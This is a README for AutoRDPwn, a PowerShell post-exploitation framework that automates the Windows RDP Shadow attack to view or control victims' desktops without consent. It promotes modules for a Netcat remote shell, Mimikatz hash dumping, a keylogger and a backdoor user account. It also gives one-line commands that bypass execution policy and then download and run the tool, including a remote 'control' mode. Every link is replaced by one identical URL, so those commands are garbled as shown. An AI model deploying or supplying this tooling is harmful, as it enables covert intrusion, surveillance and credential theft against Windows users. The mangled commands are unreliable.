<p align="center"><img width=450 alt="AutoRDPwn" src="https://github.com/Unleashur/AutoRDPwn/releases"></p>

**AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.

Thanks to the additional modules, it is possible to obtain a remote shell through Netcat, dump system hashes with Mimikatz, load a remote keylogger and much more. All this, Through a completely intuitive menu in seven different languages.

Additionally, it is possible to use it in a reverse shell through a series of parameters that are described in the usage section.


# Requirements
Powershell 4.0 or higher


# Changes
## Version 5.1
• Many bugs fixed

• Aesthetic improvements and improved waiting times

• Proxy-Aware connection through system settings

• It is now possible to use the offline tool by downloading the .zip file

• Language auto-detection by pressing the enter key

• Invoke-DCOM has been replaced by SharpRDP

• PowerUp has been replaced by Invoke-PrivescCheck

• Creation of the automatic cleaning subroutine in the victim

• New module available: SMB Shell encrypted with AES

• New module available: Change user with RunAs

*The rest of the changes can be consulted in the CHANGELOG file


# Usage
This application can be used locally, remotely or to pivot between teams.

When used remotely in a reverse shell, it is necessary to use the following parameters:

| Parameter               | Description                                                                                    | 
| :---------------------- | :--------------------------------------------------------------------------------------------- | 
| **-admin / -noadmin**   | Depending on the permissions we have, we will use one or the other                             |
| **-nogui**              | This will avoid loading the menu and some colors, guaranteed its functionality                 | 
| **-lang**               | We will choose our language (English, Spanish, French, German, Italian, Russian or Portuguese) |
| **-option**             | As with the menu, we can choose how to launch the attack                                       |
| **-shadow**             | We will decide if we want to see or control the remote device                                  |
| **-createuser**         | This parameter is optional, the user AutoRDPwn:AutoRDPwn will be created on the victim machine |
| **-noclean**            | Disables the process of undoing all changes on the victim computer                             |

**Local execution on one line:**
```
powershell -ep bypass "cd $env:temp ; iwr https://github.com/Unleashur/AutoRDPwn/releases -outfile https://github.com/Unleashur/AutoRDPwn/releases ; .\https://github.com/Unleashur/AutoRDPwn/releases"
```

**Example of remote execution on a line:**
```
powershell -ep bypass "cd $env:temp ; iwr https://github.com/Unleashur/AutoRDPwn/releases -outfile https://github.com/Unleashur/AutoRDPwn/releases ; .\https://github.com/Unleashur/AutoRDPwn/releases -admin -nogui -lang English -option 4 -shadow control -createuser"
```


### The detailed guide of use can be found at the following link:

https://github.com/Unleashur/AutoRDPwn/releases


# Screenshots
![AutoRDPwn1_en](https://github.com/Unleashur/AutoRDPwn/releases)
![AutoRDPwn2_en](https://github.com/Unleashur/AutoRDPwn/releases)


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


# Credits and Acknowledgments
This framework has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec

Some modules use third-party code, scripts, and tools, particularly:

• **Chachi-Enumerator** by *Luis Vacas* --> https://github.com/Unleashur/AutoRDPwn/releases

• **Invoke-Phant0m** by *Halil Dalabasmaz* --> https://github.com/Unleashur/AutoRDPwn/releases

• **Invoke-PowerShellTcp** by *Nikhil "SamratAshok" Mittal* --> https://github.com/Unleashur/AutoRDPwn/releases

• **Invoke-TheHash** by *Kevin Robertson* --> https://github.com/Unleashur/AutoRDPwn/releases

• **Mimikatz** by *Benjamin Delpy* --> https://github.com/Unleashur/AutoRDPwn/releases

• **PsExec** by *Mark Russinovich* --> https://github.com/Unleashur/AutoRDPwn/releases

• **RDP Wrapper** by *Stas'M Corp.* --> https://github.com/Unleashur/AutoRDPwn/releases

• **SharpRDP** by *Steven F* --> https://github.com/Unleashur/AutoRDPwn/releases

And many more, that do not fit here.. Thanks to all of them and their excellent work.


# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can contact through https://github.com/Unleashur/AutoRDPwn/releases


# Support
You can support my work buying me a coffee:

[<img width=250 alt="buymeacoffe" src="https://github.com/Unleashur/AutoRDPwn/releases">](https://github.com/Unleashur/AutoRDPwn/releases)
